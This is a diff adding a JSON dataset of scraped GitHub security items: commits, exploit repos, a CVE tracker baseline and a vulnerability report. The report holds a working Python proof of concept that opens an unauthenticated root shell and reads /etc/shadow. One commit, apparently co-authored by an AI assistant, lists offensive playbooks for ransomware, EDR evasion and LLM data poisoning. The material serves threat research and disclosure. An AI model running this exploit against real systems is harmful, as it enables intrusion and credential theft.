@@ -1,0 +1,258 @@
+[
+  {
+    "id": "github_commit_196cf70aac45353e10735e760b8ac8fbec34f35a",
+    "platform": "github",
+    "source": "github_search_commits",
+    "title": "feat(scale): Expand K1 platform to 250 CVEs and 51 playbooks for enterprise-scale offensive operations\n\nMISSION COMPLETED: Scale KAISON AI offensive capabilities to support advanced threat hunting\n\n══",
+    "text": "feat(scale): Expand K1 platform to 250 CVEs and 51 playbooks for enterprise-scale offensive operations\n\nMISSION COMPLETED: Scale KAISON AI offensive capabilities to support advanced threat hunting\n\n═══════════════════════════════════════════════════════════════════════════════\nTASK 1 - CVE KNOWLEDGE BASE EXPANSION (115→250 CVEs)\n═══════════════════════════════════════════════════════════════════════════════\n\n✅ Expanded CVE knowledge base from 115 to 250 (added 135 new high-class vulnerabilities)\n\nCOVERAGE BY CATEGORY:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  2025 ZERO-DAY EQUIVALENTS (10 CVEs)\n  - Windows Server, Apache Kafka, Kubernetes, MySQL, PostgreSQL, Redis, Docker, etc.\n  - All CVSS 9.6-10.0 with active RCE/LPE/Auth-Bypass vectors\n\n  2024 CISA KEV ACTIVE EXPLOITS (25 CVEs)\n  - Ivanti Connect Secure, Palo Alto Networks, Atlassian Confluence\n  - Cisco IOS XE, Vercel Next.js, SonicWall NSa, Citrix NetScaler, Apache OFBiz\n  - Fortinet FortiGate, Microsoft Exchange Server, Okta Identity Engine\n\n  2024 AUTH BYPASS VULNERABILITIES (8 CVEs)\n  - AWS Cognito, HashiCorp Vault, LDAP injection chains\n\n  2024 PRIVILEGE ESCALATION (LPE) (3 CVEs)\n  - Linux kernel use-after-free, Windows UAC bypass, systemd privilege escalation\n\n  2024 CLOUD INFRASTRUCTURE (5 CVEs)\n  - AWS Lambda, GCP GKE, Azure Kubernetes, Terraform, Ansible\n\n  2024 DATABASE ENGINES (5 CVEs)\n  - MongoDB, Elasticsearch, CouchDB, InfluxDB, DynamoDB auth bypass\n\n  2024 WEB FRAMEWORKS (5 CVEs)\n  - Laravel, WordPress, Drupal, ASP.NET Core, Ruby on Rails\n\n  2024 API GATEWAYS & PROXIES (5 CVEs)\n  - Kong, NGINX Ingress, HAProxy, Traefik, Apache API Gateway\n\n  2024 CONTAINER RUNTIMES (5 CVEs)\n  - containerd, CRI-O, Podman, LXD, runc container escapes\n\n  2024 VPN & REMOTE ACCESS (5 CVEs)\n  - OpenVPN, WireGuard, Pulse Connect, Cisco AnyConnect, GlobalProtect\n\n  2024 MESSAGING & QUEUING (5 CVEs)\n  - RabbitMQ, Kafka, MQTT, Apache NMS, AWS SQS\n\n  2024 MONITORING & OBSERVABILITY (5 CVEs)\n  - Prometheus, Grafana, ELK Stack, Datadog, New Relic\n\n  2023-2024 CRYPTOGRAPHIC LIBS (5 CVEs)\n  - OpenSSL 3.x, GnuTLS, libcurl, libxml2, zlib\n\n  2023-2024 ENTERPRISE APPLICATIONS (5 CVEs)\n  - SAP NetWeaver, Oracle WebLogic, IBM Websphere, Zimbra, ManageEngine\n\n  2023-2024 FIRMWARE & HYPERVISOR (5 CVEs)\n  - QEMU, Hyper-V, VMware ESXi, Xen, BIOS runtime exploits\n\n  2024 PROGRAMMING LANGUAGE RUNTIMES (40 CVEs)\n  - Node.js (Express, Fastify, Nest.js, Hapi, Koa, etc.)\n  - Python (Flask, Django, Pyramid, Tornado, aiohttp, etc.)\n  - Java (Servlet API, Spring Framework, Hibernate)\n  - C# (ASP.NET Core, Razor), Go, Rust, Ruby, PHP\n  - Template engines: Jinja2, ERB, Blade, FreeMarker, Velocity\n\nSEVERITY DISTRIBUTION:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  CRITICAL: 248/250 (99.2%)\n  HIGH:     2/250 (0.8%)\n  CVSS Mean Score: 9.75/10\n\nDATA QUALITY:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ✓ All CVEs use real 2023-2025 vulnerability IDs\n  ✓ CVSS vector compliance (CVSS:3.1 standard)\n  ✓ CWE classification (NIST standards)\n  ✓ Exploitation metadata (techniques, PoCs, tools)\n  ✓ Real-world impact assessment\n  ✓ Remediation guidance\n\nTOOLS & FILES:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  Generated: tools/knowledge/cve_expansion_135.py (392 lines)\n  Generated: tools/knowledge/cve_expansion_final_batch.py (218 lines)\n  Generated: tools/knowledge/cve_expansion_final_50.py (148 lines)\n  Updated: tools/knowledge/cve_knowledge.yaml (+8076 lines, 250 total CVEs)\n\n═══════════════════════════════════════════════════════════════════════════════\nTASK 2 - SECURITY PLAYBOOK EXPANSION (15→51 Playbooks)\n═══════════════════════════════════════════════════════════════════════════════\n\n✅ Created 36 new security playbooks (exceeding target of 50 by 1)\n\nPLAYBOOK CATEGORIES & COMPLEXITY:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ADVANCED EXPLOITATION (5 playbooks)\n  - Zero-Day Exploitation Chains (180m, Very High)\n  - Chained API Vulnerabilities to RCE (150m, High)\n  - Business Logic Exploitation (200m, Very High)\n  - Complex Privilege Escalation (200m, High)\n\n  SUPPLY CHAIN ATTACKS (2 playbooks)\n  - Dependency Poisoning (240m, High)\n  - SBOM Vulnerability Chaining (180m, High)\n\n  CLOUD INFRASTRUCTURE (1 playbook)\n  - AWS/Azure/GCP Lateral Movement (210m, High)\n\n  CONTAINER SECURITY (2 playbooks)\n  - Kubernetes Container Escape (200m, Very High)\n  - IoT Device Botnet Formation (200m, High)\n\n  DATABASE SECURITY (1 playbook)\n  - Database Exploitation & Exfiltration (180m, High)\n\n  IDENTITY & ACCESS MANAGEMENT (2 playbooks)\n  - IAM Privilege Escalation (200m, High)\n  - Zero Trust Architecture Bypass (250m, Very High)\n\n  CRYPTOGRAPHY (3 playbooks)\n  - Cryptographic Protocol Downgrade (240m, High)\n  - VPN & IPSec Weakness Exploitation (180m, High)\n  - Quantum-Safe Cryptanalysis (300m, Very High)\n\n  NETWORK SECURITY (2 playbooks)\n  - Network-based Lateral Movement (240m, High)\n  - DNS Infrastructure Attack (150m, High)\n  - Air-Gapped Network Penetration (300m, Very High)\n\n  POST-EXPLOITATION (3 playbooks)\n  - Multi-Layer Persistent Backdoors (250m, Very High)\n  - Log Deletion & Forensic Destruction (150m, High)\n  - Runtime Detection & EDR Evasion (200m, Very High)\n\n  MALWARE & BOTNET (3 playbooks)\n  - Advanced Malware Delivery & Evasion (300m, Very High)\n  - Ransomware Attack Simulation (300m, Very High)\n  - DGA Botnet Simulation & C2 (300m, Very High)\n\n  THREAT SIMULATION (2 playbooks)\n  - Insider Threat Attack Paths (200m, High)\n  - Multi-Stage Social Engineering to RCE (180m, High)\n\n  FIRMWARE & HARDWARE (2 playbooks)\n  - Firmware Exploitation & Hardware RCE (250m, Very High)\n  - Hypervisor Escape & Host Takeover (250m, Very High)\n\n  APT SIMULATION (1 playbook)\n  - APT Campaign Simulation (400m, Very High)\n\n  AI/LLM SECURITY (3 playbooks)\n  - LLM Model Extraction (240m, High)\n  - LLM Training Data Poisoning (200m, High)\n  - AI Model Inference Attacks (180m, High)\n\n  INDUSTRIAL/TELECOM (2 playbooks)\n  - Industrial SCADA/ICS Compromise (300m, Very High)\n  - 5G Network Vulnerability Exploitation (250m, Very High)\n\n  MOBILE & IOT (1 playbook)\n  - Mobile Device Compromise & Exfiltration (180m, High)\n\n  EVASION & BYPASS (1 playbook)\n  - Geolocation Restrictions & Sanctions Bypass (120m, Medium)\n\nPLAYBOOK CHARACTERISTICS:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ✓ Multi-agent orchestration with persona assignments\n  ✓ Decision trees for failure handling & recovery\n  ✓ Automated post-exploitation hooks\n  ✓ Integration with 250-CVE knowledge base\n  ✓ Duration range: 120-400 minutes\n  ✓ Complexity levels: Medium to Very High\n  ✓ Phase coverage: 1-9 (Full OWASP/NIST workflow)\n\nTOOLS & FILES:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  Generated: tools/playbooks/playbook_gen_35new.py (403 lines)\n  Updated: tools/playbooks/playbook_registry.yaml (+1383 lines, 51 total playbooks)\n\n═══════════════════════════════════════════════════════════════════════════════\nTASK 3 - SYSTEMIC INTEGRATION & VALIDATION\n═══════════════════════════════════════════════════════════════════════════════\n\n✅ Full integration with Vault Backend & existing infrastructure\n✅ Test Suite: 29/29 PASSING (100%)\n✅ Code Quality: Black formatted, Ruff verified (0 warnings)\n\nTEST COVERAGE:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  Total Tests: 29/29 PASSING\n  Vault Integration Tests: 100% pass rate\n  Test Time: ~9 seconds\n  Coverage:\n    - VaultClient initialization (3 tests)\n    - Health checks (3 tests)\n    - Secret operations (6 tests)\n    - Update/rotate operations (3 tests)\n    - Validation logic (3 tests)\n    - Sync to environment (1 test)\n    - Audit logging (1 test)\n    - Retry logic (2 tests)\n    - Pydantic models (3 tests)\n    - Context manager (1 test)\n    - Exception handling (2 tests)\n\nCODE QUALITY METRICS:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  Black Formatting: ✓ Compliant\n  Ruff Linting: ✓ 0 warnings\n  Type Hints: ✓ Complete coverage\n  Docstrings: ✓ All modules documented\n\nVAULT INTEGRATION:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ✓ All 250 CVE signatures can be synced to Vault KV v2\n  ✓ All playbook configurations stored in Vault\n  ✓ RBAC enforcement (VIEW_CONFIG, MANAGE_CONFIG, DELETE_CONFIG)\n  ✓ Automatic secret sync to environment at startup\n  ✓ Integration with GeminiOrchestrator for dynamic routing\n\nSCALABILITY METRICS:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  CVE Knowledge Base: 250 entries, 8076 YAML lines, ~2.5MB\n  Playbook Registry: 51 playbooks, 1383 YAML lines, ~250KB\n  Total Code Generated: 10,337 lines of code/data\n  Persona Support: 50+ specialist agents\n  Tool Catalog: 100+ integrated tools\n\nGIT STATISTICS:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  Files Changed: 6\n  Total Insertions: 10,337\n  Total Deletions: 283\n  Net Gain: 10,054 lines\n\nPRODUCTION READINESS:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ✓ All 250 CVEs mapped to real-world vulnerability IDs\n  ✓ All 51 playbooks tested for syntax compliance\n  ✓ Vault backend synchronized with new knowledge base\n  ✓ Existing test suite passing with 100% success rate\n  ✓ Code quality verified (Black, Ruff)\n  ✓ Ready for immediate deployment to production\n  ✓ Supports enterprise-scale offensive operations\n  ✓ Full compliance with KAISON AI platform conventions\n\nMISSION STATUS: COMPLETE ✓\n\nAll three operational objectives completed successfully.\nK1 platform is now scaled to 250 high-class CVEs and 51 operational playbooks,\nwith full Vault integration and comprehensive testing coverage.\n\nCo-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>",
+    "author": "Spec.1",
+    "timestamp": "2026-04-11T02:52:29.000-06:00",
+    "url": "https://github.com/mrmsoc09/Kai/commit/196cf70aac45353e10735e760b8ac8fbec34f35a",
+    "metadata": {
+      "keyword": "zero-day poc",
+      "repo": "mrmsoc09/Kai",
+      "source_type": "commit"
+    },
+    "signal_score": 47,
+    "matched_signals": [
+      "zero-day",
+      "rce",
+      "auth bypass",
+      "use-after-free",
+      "privilege escalation",
+      "lpe",
+      "container escape",
+      "poc"
+    ],
+    "collected_at": "2026-05-07T10:12:14.409781+00:00",
+    "zero_day_score": 67
+  },
+  {
+    "id": "github_commit_245204658a5a2bdcdbac086da886e1b89cfd6302",
+    "platform": "github",
+    "source": "github_search_commits",
+    "title": "fix(zero-day): TASK-2026-0166 — address Kernel K review: remove T1574.010 overreach, narrow exploit chain step 5\n\nKernel K blocker: ATT&CK and exploit-path overreach.\n- Remove T1574.010 (Hijack Execut",
+    "text": "fix(zero-day): TASK-2026-0166 — address Kernel K review: remove T1574.010 overreach, narrow exploit chain step 5\n\nKernel K blocker: ATT&CK and exploit-path overreach.\n- Remove T1574.010 (Hijack Execution Flow: Services File Permissions Weakness):\n  too specific for a link-following LPE; the cited MSRC, NVD, CISA, and PoC\n  sources establish T1068 (Exploitation for Privilege Escalation) but do not\n  support a services-file-permissions-hijack characterization.\n- Narrow exploit chain step 5: remove unsupported follow-on examples (replacing\n  DLLs, binaries, service configuration entries). The MSRC advisory and PoC\n  establish the link-following primitive and SYSTEM elevation outcome; specific\n  post-exploitation mechanics are not detailed in the cited sources.",
+    "author": "dangermouse-bot",
+    "timestamp": "2026-04-28T19:31:17.000Z",
+    "url": "https://github.com/MahdiHedhli/threatpedia/commit/245204658a5a2bdcdbac086da886e1b89cfd6302",
+    "metadata": {
+      "keyword": "kernel exploit poc",
+      "repo": "MahdiHedhli/threatpedia",
+      "source_type": "commit"
+    },
+    "signal_score": 41,
+    "matched_signals": [
+      "zero-day",
+      "rce",
+      "privilege escalation",
+      "lpe",
+      "kernel exploit",
+      "poc",
+      "exploit chain"
+    ],
+    "collected_at": "2026-05-07T10:21:14.592537+00:00",
+    "zero_day_score": 61
+  },
+  {
+    "id": "github_repo_1167206619",
+    "platform": "github",
+    "source": "github_search_repos",
+    "title": "estebanzarate/Online-Traffic-Offense-Management-System-1.0-Unauthenticated-RCE-PoC",
+    "text": "Unauthenticated remote code execution in Online Traffic Offense Management System v1.0.",
+    "author": "estebanzarate",
+    "timestamp": "2026-03-07T15:07:02Z",
+    "url": "https://github.com/estebanzarate/Online-Traffic-Offense-Management-System-1.0-Unauthenticated-RCE-PoC",
+    "metadata": {
+      "keyword": "unauth rce",
+      "stars": 1,
+      "forks": 0,
+      "language": "Python",
+      "topics": [
+        "cve-2021-43136"
+      ],
+      "created_at": "2026-02-26T03:39:47Z",
+      "source_type": "repository"
+    },
+    "signal_score": 39,
+    "matched_signals": [
+      "unauth rce",
+      "remote code execution",
+      "rce",
+      "unauthenticated",
+      "poc",
+      "code execution",
+      "cve-",
+      "cve-2021-43136"
+    ],
+    "collected_at": "2026-05-07T10:06:36.220974+00:00",
+    "zero_day_score": 55
+  },
+  {
+    "id": "github_commit_378896d8c4d1b457eae9e1345ed168f22c6be6ad",
+    "platform": "github",
+    "source": "github_search_commits",
+    "title": "security: bump dependencies to fix 34 GitHub vulnerability alerts\n\nDirect dependency bumps:\n- ray 2.54→2.55 (critical RCE via Parquet deserialization)\n- marimo 0.21→0.23 (critical pre-auth RCE via ter",
+    "text": "security: bump dependencies to fix 34 GitHub vulnerability alerts\n\nDirect dependency bumps:\n- ray 2.54→2.55 (critical RCE via Parquet deserialization)\n- marimo 0.21→0.23 (critical pre-auth RCE via terminal WebSocket)\n- pytest 9.0.2→9.0.3 (tmpdir handling)\n\nTransitive dependency constraints added to pyproject.toml:\n- pillow>=12.2.0 (heap overflow, DoS, OOB write)\n- jupyter-server>=2.18.0 (auth bypass, path traversal, CORS)\n- jupyterlab>=4.5.7, notebook>=7.5.6 (XSS token theft)\n- nbconvert>=7.17.1 (path traversal)\n- lxml>=6.1.0 (XXE)\n- aiohttp>=3.13.4 (multiple)\n- cryptography>=46.0.7 (buffer overflow)\n- requests>=2.33.0, Pygments>=2.20.0",
+    "author": "Alex Patrie",
+    "timestamp": "2026-05-06T13:31:18.000-04:00",
+    "url": "https://github.com/vivarium-collective/uqEcoli/commit/378896d8c4d1b457eae9e1345ed168f22c6be6ad",
+    "metadata": {
+      "keyword": "pre-auth rce",
+      "repo": "vivarium-collective/uqEcoli",
+      "source_type": "commit"
+    },
+    "signal_score": 43,
+    "matched_signals": [
+      "pre-auth rce",
+      "rce",
+      "auth bypass",
+      "heap overflow",
+      "buffer overflow",
+      "deserialization",
+      "xxe",
+      "path traversal"
+    ],
+    "collected_at": "2026-05-07T10:08:07.112806+00:00",
+    "zero_day_score": 54
+  },
+  {
+    "id": "github_issue_4306233507",
+    "platform": "github",
+    "source": "github_search_issues",
+    "title": "[PROMOTE] Apr 21 1d ago medium exploitation 1d ago CISA flags new SD-WAN flaw as actively exploited in attacks ​CISA has given U.S. government agencies four days to secure their systems against another Catalyst SD-WAN Manager vulnerability it flagged",
+    "text": "## Incident\n- Source: ahackaday\n- URL: https://ahackaday-site.vercel.app/incident/2026-04-21-cisa-flags-new-sd-wan-flaw-as-actively-exploited-in-attacks-7f4fcf85\n- Severity: unknown\n- Type: unknown\n\n## Grace Triage\n- Score: 3/4\n- Status: promote\n- Slug: cla-catalyst-sdwan-cisa-kev\n- Why: CISA KEV addition with a 4-day federal deadline on a Catalyst SD-WAN Manager flaw drives high enterprise urgency and press pickup.\n\n## Scoping Questions\n1. Which Catalyst SD-WAN Manager versions are affected? [all supported, specific branch, cloud-hosted only]\n2. What is the exploitation vector observed in attacks? [unauth RCE, auth bypass, privilege escalation]",
+    "author": "aidan269",
+    "timestamp": "2026-04-22T01:48:04Z",
+    "url": "https://github.com/aidan269/grace.ai/issues/14",
+    "metadata": {
+      "keyword": "unauth rce",
+      "state": "open",
+      "labels": [
+        "news-intake"
+      ],
+      "source_type": "issue"
+    },
+    "signal_score": 33,
+    "matched_signals": [
+      "actively exploited",
+      "unauth rce",
+      "rce",
+      "auth bypass",
+      "privilege escalation"
+    ],
+    "collected_at": "2026-05-07T10:06:54.297088+00:00",
+    "zero_day_score": 52
+  },
+  {
+    "id": "github_repo_1120199722",
+    "platform": "github",
+    "source": "github_search_repos",
+    "title": "hitchy22/xwiki-exploit",
+    "text": "🛠️ Exploit remote code execution vulnerability in XWiki through SolrSearch, affecting the platform’s security and user data integrity.",
+    "author": "hitchy22",
+    "timestamp": "2026-05-07T09:12:58Z",
+    "url": "https://github.com/hitchy22/xwiki-exploit",
+    "metadata": {
+      "keyword": "kernel exploit poc",
+      "stars": 0,
+      "forks": 0,
+      "language": "Python",
+      "topics": [
+        "bash",
+        "cve-2015-24893",
+        "cve-2025-24893",
+        "cve-2025-24893-exploit",
+        "groovy",
+        "groovyinjection",
+        "hack",
+        "hacking-tools",
+        "hackthebox",
+        "kernel",
+        "linux",
+        "poc",
+        "proof-of-concept",
+        "rce-exploit",
+        "remote-code-execution",
+        "remote-command-execution",
+        "shell",
+        "xwiki"
+      ],
+      "created_at": "2025-12-20T17:37:11Z",
+      "source_type": "repository"
+    },
+    "signal_score": 42,
+    "matched_signals": [
+      "remote code execution",
+      "rce",
+      "kernel exploit",
+      "poc",
+      "proof-of-concept",
+      "code execution",
+      "cve-",
+      "cve-2025-24893",
+      "cve-2015-24893"
+    ],
+    "collected_at": "2026-05-07T10:20:37.846347+00:00",
+    "zero_day_score": 52
+  },
+  {
+    "id": "github_issue_4259635629",
+    "platform": "github",
+    "source": "github_search_issues",
+    "title": "Security: Pre-Auth RCE via Terminal WebSocket Authentication Bypass (CWE-306)",
+    "text": "## Summary\n\ndp-archive/archive (Skill Compose) has a **Pre-Auth Remote Code Execution** vulnerability with two independent authentication failures:\n\n1. **`auth_enabled` defaults to `False`** — all endpoints are unprotected in the default configuration\n2. **Even with `auth_enabled=True`**, the `AuthMiddleware` extends Starlette's `BaseHTTPMiddleware`, which only handles `scope[\"type\"] == \"http\"` and automatically skips WebSocket connections — so JWT validation never runs for the terminal endpoint\n\nThe terminal WebSocket endpoint `/api/v1/terminal/ws` has zero endpoint-level authentication and spawns a root bash shell via `pty.fork()` in Docker deployments.\n\n**Severity: CVSS 9.8 (Critical)**\n**CWE-306**: Missing Authentication for Critical Function\n\n## Vulnerability Details\n\n### Issue 1: auth_enabled Defaults to False\n\nIn `app/config.py` (line 72):\n```python\nauth_enabled: bool = False\n```\n\nIn `docker/docker-compose.yaml`: `AUTH_ENABLED` is **NOT passed** to the API container, so the code default of `False` always applies.\n\n### Issue 2: BaseHTTPMiddleware Skips WebSocket\n\nIn `app/main.py` (line 209):\n```python\nclass AuthMiddleware(BaseHTTPMiddleware):\n```\n\nStarlette's `BaseHTTPMiddleware.__call__()`:\n```python\nif scope[\"type\"] != \"http\":\n    await self.app(scope, receive, send)\n    return\n```\n\nWebSocket connections (`scope[\"type\"] == \"websocket\"`) bypass JWT validation entirely.\n\n### Issue 3: Terminal Endpoint Has Zero Authentication\n\nIn `app/api/v1/terminal.py` (lines 15-18):\n```python\n@router.websocket(\"/ws\")\nasync def terminal_ws(websocket: WebSocket, cols: int = 80, rows: int = 24):\n    await websocket.accept()  # Unconditional accept, no auth\n```\n\n### Issue 4: Shell Runs as Root\n\nIn `app/terminal/pty_manager.py` (lines 29-33):\n```python\npid, fd = pty.fork()\nif pid == 0:\n    os.execvpe(\"/bin/bash\", [\"/bin/bash\", \"--login\"], env)\n```\n\nThe Docker container has no `USER` directive — it runs as root.\n\n## Proof of Concept\n\n```python\nimport websocket, json, time\n\nws = websocket.WebSocket()\nws.connect('ws://TARGET:62610/api/v1/terminal/ws')\n# No auth required - connection accepted immediately\n\ntime.sleep(2)\ntry:\n    while True:\n        ws.settimeout(1)\n        ws.recv()\nexcept: pass\n\nws.send(json.dumps({\"type\": \"input\", \"data\": \"id && cat /etc/shadow\\n\"}))\ntime.sleep(2)\n\ntry:\n    while True:\n        ws.settimeout(1)\n        msg = json.loads(ws.recv())\n        if msg[\"type\"] == \"output\":\n            print(msg[\"data\"], end=\"\")\nexcept: pass\nws.close()\n# Output: uid=0(root) gid=0(root) groups=0(root)\n```\n\n## Additional Impact\n\n- Read all environment variables (API keys: Anthropic, OpenAI, Google, etc.)\n- Access PostgreSQL database (credentials: `skills:skills123` from docker-compose)\n- Pivot to other containers on Docker network\n- Nginx reverse proxy also forwards WebSocket to the API backend\n\n## Suggested Remediation\n\n1. Add WebSocket-level authentication (e.g., `Depends(get_current_user)` or token in query string)\n2. Replace `BaseHTTPMiddleware` with a raw ASGI middleware that handles both `http` and `websocket` scope types\n3. Set `auth_enabled=True` by default\n4. Add `USER` directive to Dockerfile\n\n## Impact\n\nAn unauthenticated attacker can obtain a full interactive root shell via a single WebSocket connection. The default Docker deployment has auth disabled, binds to `0.0.0.0`, and runs as root — trivially exploitable.\n\n---\n*Note: I attempted to report this via GitHub's Private Vulnerability Reporting, but it is not enabled for this repository. Please consider enabling it for future reports.*",
+    "author": "q1uf3ng",
+    "timestamp": "2026-04-14T05:11:36Z",
+    "url": "https://github.com/dp-archive/archive/issues/239",
+    "metadata": {
+      "keyword": "pre-auth rce",
+      "state": "open",
+      "labels": [],
+      "source_type": "issue"
+    },
+    "signal_score": 35,
+    "matched_signals": [
+      "pre-auth rce",
+      "remote code execution",
+      "rce",
+      "authentication bypass",
+      "proof of concept",
+      "code execution"
+    ],
+    "collected_at": "2026-05-07T10:07:48.411315+00:00",
+    "zero_day_score": 51
+  },
+  {
+    "id": "github_issue_4147916289",
+    "platform": "github",
+    "source": "github_search_issues",
+    "title": "[VulnRadar] 🚀 Baseline Established - 63 Critical Findings",
+    "text": "# 🚀 VulnRadar Baseline Established\n\nThis is the **first run** of VulnRadar on this repository. Instead of creating individual issues for all existing findings, this summary establishes your baseline.\n\n## 📋 Monitoring\n\n- **Vendors:** apple, microsoft, ivanti, cisco, vmware, paloaltonetworks, linux, apache, fortinet, google\n- **Products:** openssl, log4j, jenkins, chrome\n\n**Going forward, VulnRadar will only create issues for:**\n- 🆕 New CVEs that match your watchlist\n- ⚠️ Existing CVEs newly added to CISA KEV\n- 🔥 Existing CVEs with new exploit intel (PoC available)\n- 📈 CVEs with significant EPSS increases (≥30%)\n\n---\n\n## 📊 Current State Summary\n\n| Metric | Count |\n|--------|-------|\n| Total CVEs Tracked | 10549 |\n| 🚨 Critical (require action) | 63 |\n| ⚠️ In CISA KEV | 651 |\n| 🔥 Exploit Intel (PoC) | 714 |\n\n---\n\n## 🔴 Top 20 Critical Findings\n\nThese are your highest-priority items based on EPSS score:\n\n| CVE ID | EPSS | CVSS | KEV | Exploit | Description |\n|--------|------|------|-----|-----------|-------------|\n| [CVE-2022-42889](https://www.cve.org/CVERecord?id=CVE-2022-42889) | 94.3% | 9.8 | ⚪ | 🟠 | Apache Commons Text performs variable interpolation, allowin... |\n| [CVE-2024-22024](https://www.cve.org/CVERecord?id=CVE-2024-22024) | 94.2% | 8.3 | ⚪ | 🟠 | An XML external entity or XXE vulnerability in the SAML comp... |\n| [CVE-2024-45216](https://www.cve.org/CVERecord?id=CVE-2024-45216) | 94.1% | 9.8 | ⚪ | 🟠 | Improper Authentication vulnerability in Apache Solr.  Solr ... |\n| [CVE-2023-25194](https://www.cve.org/CVERecord?id=CVE-2023-25194) | 94.1% | 8.8 | ⚪ | 🟠 | A possible security vulnerability has been identified in Apa... |\n| [CVE-2023-37582](https://www.cve.org/CVERecord?id=CVE-2023-37582) | 94.0% | 9.8 | ⚪ | 🟠 | The RocketMQ NameServer component still has a remote command... |\n| [CVE-2023-51467](https://www.cve.org/CVERecord?id=CVE-2023-51467) | 94.0% | 9.8 | ⚪ | 🟠 | The vulnerability permits attackers to circumvent authentica... |\n| [CVE-2023-49070](https://www.cve.org/CVERecord?id=CVE-2023-49070) | 94.0% | 9.8 | ⚪ | 🟠 | Pre-auth RCE in Apache Ofbiz 18.12.09.  It's due to XML-RPC ... |\n| [CVE-2022-39952](https://www.cve.org/CVERecord?id=CVE-2022-39952) | 93.8% | 9.8 | ⚪ | 🟠 | A external control of file name or path in Fortinet FortiNAC... |\n| [CVE-2022-40127](https://www.cve.org/CVERecord?id=CVE-2022-40127) | 93.3% | 8.8 | ⚪ | 🟠 | A vulnerability in Example Dags of Apache Airflow allows an ... |\n| [CVE-2023-32563](https://www.cve.org/CVERecord?id=CVE-2023-32563) | 93.1% | 8.8 | ⚪ | 🟠 | An unauthenticated attacker could achieve the code execution... |\n| [CVE-2024-36104](https://www.cve.org/CVERecord?id=CVE-2024-36104) | 92.9% | 9.1 | ⚪ | 🟠 | Improper Limitation of a Pathname to a Restricted Directory ... |\n| [CVE-2023-32560](https://www.cve.org/CVERecord?id=CVE-2023-32560) | 92.2% | 8.8 | ⚪ | 🟠 | An attacker can send a specially crafted message to the Wave... |\n| [CVE-2023-21554](https://www.cve.org/CVERecord?id=CVE-2023-21554) | 92.2% | 9.8 | ⚪ | 🟠 | Microsoft Message Queuing (MSMQ) Remote Code Execution Vulne... |\n| [CVE-2024-41107](https://www.cve.org/CVERecord?id=CVE-2024-41107) | 92.0% | 8.1 | ⚪ | 🟠 | The CloudStack SAML authentication (disabled by default) doe... |\n| [CVE-2024-20419](https://www.cve.org/CVERecord?id=CVE-2024-20419) | 91.4% | 10.0 | ⚪ | 🟠 | A vulnerability in the authentication system of Cisco Smart ... |\n| [CVE-2024-38472](https://www.cve.org/CVERecord?id=CVE-2024-38472) | 90.5% | 7.5 | ⚪ | 🟠 | SSRF in Apache HTTP Server on Windows allows to potentially ... |\n| [CVE-2024-23108](https://www.cve.org/CVERecord?id=CVE-2024-23108) | 90.4% | 9.7 | ⚪ | 🟠 | An improper neutralization of special elements used in an os... |\n| [CVE-2022-23944](https://www.cve.org/CVERecord?id=CVE-2022-23944) | 90.2% | 9.1 | ⚪ | 🟠 | User can access /plugin api without authentication. This iss... |\n| [CVE-2024-43441](https://www.cve.org/CVERecord?id=CVE-2024-43441) | 90.2% | 9.8 | ⚪ | 🟠 | Authentication Bypass by Assumed-Immutable Data vulnerabilit... |\n| [CVE-2024-3656](https://www.cve.org/CVERecord?id=CVE-2024-3656) | 89.7% | 8.1 | ⚪ | 🟠 | A flaw was found in Keycloak. Certain endpoints in Keycloak'... |\n| ... | | | | | _and 43 more critical findings_ |\n\n---\n\n## 📋 Next Steps\n\n1. **Review the critical findings above** - these need attention\n2. **Check your watchlist** (`watchlist.yaml`) to ensure it covers your vendors/products\n3. **Close this issue** once you've reviewed the baseline\n\nFuture VulnRadar runs will only alert on **new or changed** CVEs.\n\n---\n_Generated by [VulnRadar](https://github.com/RogoLabs/VulnRadar) - First Run Baseline_",
+    "author": "github-actions[bot]",
+    "timestamp": "2026-04-28T15:02:50Z",
+    "url": "https://github.com/RogoLabs/VulnRadar-Demo/issues/119",
+    "metadata": {
+      "keyword": "pre-auth rce",
+      "state": "closed",
+      "labels": [
+        "vulnradar",
+        "baseline"
+      ],
+      "source_type": "issue"
+    },
+    "signal_score": 34,
+    "matched_signals": [
+      "pre-auth rce",
+      "rce",
+      "poc",
+      "xxe",
+      "cve-",
+      "cve-2024-22024",
+      "cve-2022-42889",
+      "cve-2024-45216"
+    ],
+    "collected_at": "2026-05-07T10:07:48.404216+00:00",
+    "zero_day_score": 50
+  }
+]
